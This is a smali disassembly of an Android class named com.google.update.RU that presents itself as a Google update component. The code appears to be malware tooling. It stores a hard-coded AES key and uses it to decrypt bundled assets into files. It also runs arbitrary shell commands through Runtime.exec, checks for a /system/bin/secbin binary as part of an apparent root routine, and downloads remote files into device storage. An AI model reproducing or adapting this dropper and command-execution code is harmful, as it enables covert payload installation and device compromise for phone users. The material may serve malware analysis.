.class public Lcom/google/update/RU;
.super Ljava/lang/Object;
.source "RU.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/update/RU$U10;,
        Lcom/google/update/RU$U11;,
        Lcom/google/update/RU$U12;
    }
.end annotation


# static fields
.field private static WP:[B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 208
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/google/update/RU;->WP:[B

    .line 41
    return-void

    .line 208
    :array_0
    .array-data 1
        0x44t
        0x65t
        0x74t
        0x61t
        0x5ft
        0x43t
        0x31t
        0x2at
        0x54t
        0x23t
        0x52t
        0x75t
        0x4ft
        0x50t
        0x75t
        0x73t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static U1(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p0, "P1"    # Landroid/content/Context;
    .param p1, "P2"    # Ljava/lang/String;

    .prologue
    const-string v3, "/"

    .line 44
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    .line 46
    .local v0, "a":Ljava/lang/String;
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v1

    .line 47
    const-string v2, "mounted"

    .line 46
    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 48
    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    .line 50
    :cond_0
    if-eqz p1, :cond_1

    .line 51
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 54
    :cond_1
    return-object v0
.end method

.method public static U2(Landroid/content/Context;)Z
    .locals 5
    .param p0, "P1"    # Landroid/content/Context;

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    .line 61
    const-string v2, "connectivity"

    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 64
    .local v0, "a":Landroid/net/ConnectivityManager;
    invoke-virtual {v0, v3}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 65
    .local v1, "info":Landroid/net/NetworkInfo;
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    move v2, v3

    .line 70
    :goto_0
    return v2

    .line 67
    :cond_0
    invoke-virtual {v0, v4}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 68
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_1

    move v2, v3

    goto :goto_0

    :cond_1
    move v2, v4

    .line 70
    goto :goto_0
.end method

.method public static U3()Z
    .locals 2

    .prologue
    .line 76
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/secbin"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 77
    invoke-static {}, Lcom/google/update/RU;->U4()Z

    move-result v0

    .line 79
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static U4()Z
    .locals 1

    .prologue
    .line 84
    invoke-static {}, Lcom/google/update/RU$U12;->U1()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    .line 86
    :goto_0
    return v0

    .line 85
    :cond_0
    invoke-static {}, Lcom/google/update/RU$U12;->U3()V

    .line 86
    invoke-static {}, Lcom/google/update/RU$U12;->U1()Z

    move-result v0

    goto :goto_0
.end method

.method public static U5(Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p0, "P1"    # Ljava/lang/String;
    .param p1, "P2"    # Ljava/lang/String;

    .prologue
    .line 93
    :try_start_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lcom/google/update/RU$1;

    invoke-direct {v2, p0, p1}, Lcom/google/update/RU$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 98
    .local v0, "a":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 103
    .end local v0    # "a":Ljava/lang/Thread;
    :goto_0
    return-void

    .line 99
    :catch_0
    move-exception v2

    move-object v1, v2

    .line 100
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static U6(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p0, "P1"    # Ljava/lang/String;
    .param p1, "P2"    # Ljava/lang/String;

    .prologue
    .line 108
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    .line 109
    .local v0, "a":Ljava/lang/Runtime;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {p0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 110
    .local v2, "fullCmd":Ljava/lang/String;
    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 114
    .end local v0    # "a":Ljava/lang/Runtime;
    .end local v2    # "fullCmd":Ljava/lang/String;
    :goto_0
    return-void

    .line 111
    :catch_0
    move-exception v3

    move-object v1, v3

    .line 112
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 9
    .param p0, "P1"    # Landroid/content/Context;
    .param p1, "P2"    # Ljava/lang/String;
    .param p2, "P3"    # Ljava/lang/String;
    .param p3, "P4"    # I

    .prologue
    .line 119
    const/4 v0, 0x0

    .line 120
    .local v0, "a":Ljava/io/OutputStream;
    const/4 v2, 0x0

    .line 121
    .local v2, "b":Ljava/io/InputStream;
    if-gtz p3, :cond_1

    .line 138
    :cond_0
    :goto_0
    return-void

    .line 124
    :cond_1
    :try_start_0
    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 126
    .end local v0    # "a":Ljava/io/OutputStream;
    .local v1, "a":Ljava/io/OutputStream;
    :try_start_1
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "/assets/"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/Class;->getResourceAsStream(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v2

    .line 127
    new-array v3, p3, [B

    .line 128
    .local v3, "c":[B
    invoke-virtual {v2, v3}, Ljava/io/InputStream;->read([B)I

    .line 129
    invoke-static {v3}, Lcom/google/update/RU;->U9([B)[B

    move-result-object v4

    .line 130
    .local v4, "decryptBuff":[B
    invoke-virtual {v1, v4}, Ljava/io/OutputStream;->write([B)V

    .line 131
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_7
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 135
    if-eqz v2, :cond_2

    :try_start_2
    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    .line 136
    :cond_2
    :goto_1
    if-eqz v1, :cond_6

    :try_start_3
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    move-object v0, v1

    .end local v1    # "a":Ljava/io/OutputStream;
    .restart local v0    # "a":Ljava/io/OutputStream;
    goto :goto_0

    .line 132
    .end local v3    # "c":[B
    .end local v4    # "decryptBuff":[B
    :catch_0
    move-exception v6

    move-object v5, v6

    .line 133
    .local v5, "e":Ljava/lang/Exception;
    :goto_2
    :try_start_4
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 135
    if-eqz v2, :cond_3

    :try_start_5
    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 136
    :cond_3
    :goto_3
    if-eqz v0, :cond_0

    :try_start_6
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_0

    :catch_1
    move-exception v6

    goto :goto_0

    .line 134
    .end local v5    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v6

    .line 135
    :goto_4
    if-eqz v2, :cond_4

    :try_start_7
    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    .line 136
    :cond_4
    :goto_5
    if-eqz v0, :cond_5

    :try_start_8
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    .line 137
    :cond_5
    :goto_6
    throw v6

    .line 136
    .end local v0    # "a":Ljava/io/OutputStream;
    .restart local v1    # "a":Ljava/io/OutputStream;
    .restart local v3    # "c":[B
    .restart local v4    # "decryptBuff":[B
    :catch_2
    move-exception v6

    move-object v0, v1

    .end local v1    # "a":Ljava/io/OutputStream;
    .restart local v0    # "a":Ljava/io/OutputStream;
    goto :goto_0

    .line 135
    .end local v3    # "c":[B
    .end local v4    # "decryptBuff":[B
    .restart local v5    # "e":Ljava/lang/Exception;
    :catch_3
    move-exception v6

    goto :goto_3

    .end local v5    # "e":Ljava/lang/Exception;
    :catch_4
    move-exception v7

    goto :goto_5

    .line 136
    :catch_5
    move-exception v7

    goto :goto_6

    .line 135
    .end local v0    # "a":Ljava/io/OutputStream;
    .restart local v1    # "a":Ljava/io/OutputStream;
    .restart local v3    # "c":[B
    .restart local v4    # "decryptBuff":[B
    :catch_6
    move-exception v6

    goto :goto_1

    .line 134
    .end local v3    # "c":[B
    .end local v4    # "decryptBuff":[B
    :catchall_1
    move-exception v6

    move-object v0, v1

    .end local v1    # "a":Ljava/io/OutputStream;
    .restart local v0    # "a":Ljava/io/OutputStream;
    goto :goto_4

    .line 132
    .end local v0    # "a":Ljava/io/OutputStream;
    .restart local v1    # "a":Ljava/io/OutputStream;
    :catch_7
    move-exception v6

    move-object v5, v6

    move-object v0, v1

    .end local v1    # "a":Ljava/io/OutputStream;
    .restart local v0    # "a":Ljava/io/OutputStream;
    goto :goto_2

    .end local v0    # "a":Ljava/io/OutputStream;
    .restart local v1    # "a":Ljava/io/OutputStream;
    .restart local v3    # "c":[B
    .restart local v4    # "decryptBuff":[B
    :cond_6
    move-object v0, v1

    .end local v1    # "a":Ljava/io/OutputStream;
    .restart local v0    # "a":Ljava/io/OutputStream;
    goto :goto_0
.end method

.method public static U8(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;
    .locals 7
    .param p0, "P1"    # Landroid/content/Context;
    .param p1, "P2"    # Ljava/lang/String;

    .prologue
    .line 146
    if-eqz p1, :cond_0

    const-string v0, ""

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    :cond_0
    const/4 p0, 0x0

    .line 204
    .end local p0    # "P1":Landroid/content/Context;
    .end local p1    # "P2":Ljava/lang/String;
    :cond_1
    :goto_0
    return-object p0

    .line 148
    .restart local p0    # "P1":Landroid/content/Context;
    .restart local p1    # "P2":Ljava/lang/String;
    :cond_2
    const/4 v0, 0x0

    .line 150
    .local v0, "a":Ljava/net/URL;
    :try_start_0
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 152
    .end local v0    # "a":Ljava/net/URL;
    .local v1, "a":Ljava/net/URL;
    const/4 v0, 0x0

    .line 153
    .local v0, "b":Ljava/net/HttpURLConnection;
    :try_start_1
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    .end local v0    # "b":Ljava/net/HttpURLConnection;
    check-cast v0, Ljava/net/HttpURLConnection;

    .line 154
    .restart local v0    # "b":Ljava/net/HttpURLConnection;
    const/16 v2, 0x7530

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 155
    const/16 v2, 0x7530

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 156
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 157
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 159
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    .line 161
    .local v0, "c":Ljava/io/InputStream;
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 162
    .local v2, "d":Ljava/io/File;
    if-nez v2, :cond_3

    const/4 p0, 0x0

    goto :goto_0

    .line 164
    :cond_3
    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object p1

    .line 165
    .local p1, "e":Ljava/lang/String;
    const-string v2, "download"

    .end local v2    # "d":Ljava/io/File;
    invoke-static {p0, v2}, Lcom/google/update/RU;->U1(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 166
    .local v2, "f":Ljava/lang/String;
    new-instance p0, Ljava/io/File;

    .end local p0    # "P1":Landroid/content/Context;
    invoke-direct {p0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 167
    .local p0, "ff":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_4

    invoke-virtual {p0}, Ljava/io/File;->mkdir()Z

    .line 169
    :cond_4
    const-string v3, "sdcard"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_5

    .line 170
    invoke-virtual {p0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p0

    .line 171
    .local p0, "fff":[Ljava/io/File;
    if-eqz p0, :cond_5

    array-length v3, p0

    if-lez v3, :cond_5

    .line 172
    array-length v4, p0

    const/4 v3, 0x0

    move v5, v3

    :goto_1
    if-lt v5, v4, :cond_7

    .line 178
    .end local p0    # "fff":[Ljava/io/File;
    :cond_5
    const/4 p0, 0x0

    .line 179
    .local p0, "h":Ljava/io/FileOutputStream;
    new-instance v3, Ljava/io/FileOutputStream;

    new-instance p0, Ljava/lang/StringBuilder;

    .end local p0    # "h":Ljava/io/FileOutputStream;
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {p0, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-direct {v3, p0}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 181
    .local v3, "h":Ljava/io/FileOutputStream;
    const/16 p0, 0x800

    new-array p0, p0, [B

    .line 182
    .local p0, "buffer":[B
    const/4 v4, 0x0

    .line 183
    .local v4, "i":I
    if-eqz v0, :cond_6

    if-eqz v3, :cond_6

    .line 185
    :goto_2
    invoke-virtual {v0, p0}, Ljava/io/InputStream;->read([B)I

    move-result v4

    const/4 v5, -0x1

    if-ne v4, v5, :cond_9

    .line 188
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->flush()V

    .line 189
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    .line 190
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 192
    const/4 p0, 0x2

    new-array p0, p0, [Ljava/lang/String;

    .line 193
    .local p0, "j":[Ljava/lang/String;
    const/4 v0, 0x0

    new-instance v3, Ljava/lang/StringBuilder;

    .end local v0    # "c":Ljava/io/InputStream;
    .end local v3    # "h":Ljava/io/FileOutputStream;
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    .end local v4    # "i":I
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, p0, v0

    .line 194
    const/4 v0, 0x1

    aput-object p1, p0, v0

    .line 195
    new-instance v0, Ljava/io/File;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .end local v2    # "f":Ljava/lang/String;
    invoke-direct {v3, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    .end local p1    # "e":Ljava/lang/String;
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 196
    .local v0, "k":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result p1

    if-nez p1, :cond_1

    .end local v0    # "k":Ljava/io/File;
    .end local p0    # "j":[Ljava/lang/String;
    :cond_6
    move-object p0, v1

    .line 204
    .end local v1    # "a":Ljava/net/URL;
    .local p0, "a":Ljava/net/URL;
    :goto_3
    const/4 p0, 0x0

    goto/16 :goto_0

    .line 172
    .local v0, "c":Ljava/io/InputStream;
    .restart local v1    # "a":Ljava/net/URL;
    .restart local v2    # "f":Ljava/lang/String;
    .local p0, "fff":[Ljava/io/File;
    .restart local p1    # "e":Ljava/lang/String;
    :cond_7
    aget-object v3, p0, v5

    .line 173
    .local v3, "g":Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_8

    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    .line 172
    :cond_8
    add-int/lit8 v3, v5, 0x1

    move v5, v3

    goto :goto_1

    .line 186
    .local v3, "h":Ljava/io/FileOutputStream;
    .restart local v4    # "i":I
    .local p0, "buffer":[B
    :cond_9
    const/4 v5, 0x0

    invoke-virtual {v3, p0, v5, v4}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 200
    .end local v0    # "c":Ljava/io/InputStream;
    .end local v2    # "f":Ljava/lang/String;
    .end local v3    # "h":Ljava/io/FileOutputStream;
    .end local v4    # "i":I
    .end local p0    # "buffer":[B
    .end local p1    # "e":Ljava/lang/String;
    :catch_0
    move-exception p0

    move-object p1, p0

    move-object p0, v1

    .line 201
    .end local v1    # "a":Ljava/net/URL;
    .local p0, "a":Ljava/net/URL;
    .local p1, "e":Ljava/lang/Exception;
    :goto_4
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3

    .line 200
    .local v0, "a":Ljava/net/URL;
    .local p0, "P1":Landroid/content/Context;
    .local p1, "P2":Ljava/lang/String;
    :catch_1
    move-exception p0

    move-object p1, p0

    move-object p0, v0

    .end local v0    # "a":Ljava/net/URL;
    .local p0, "a":Ljava/net/URL;
    goto :goto_4
.end method

.method public static U9([B)[B
    .locals 6
    .param p0, "P1"    # [B
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const-string v5, "AES"

    .line 213
    new-instance v0, Ljavax/crypto/spec/SecretKeySpec;

    sget-object v3, Lcom/google/update/RU;->WP:[B

    const-string v4, "AES"

    invoke-direct {v0, v3, v5}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 214
    .local v0, "a":Ljavax/crypto/spec/SecretKeySpec;
    const-string v3, "AES"

    invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    .line 215
    .local v1, "b":Ljavax/crypto/Cipher;
    const/4 v3, 0x2

    invoke-virtual {v1, v3, v0}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 216
    invoke-virtual {v1, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v2

    .line 217
    .local v2, "c":[B
    return-object v2
.end method
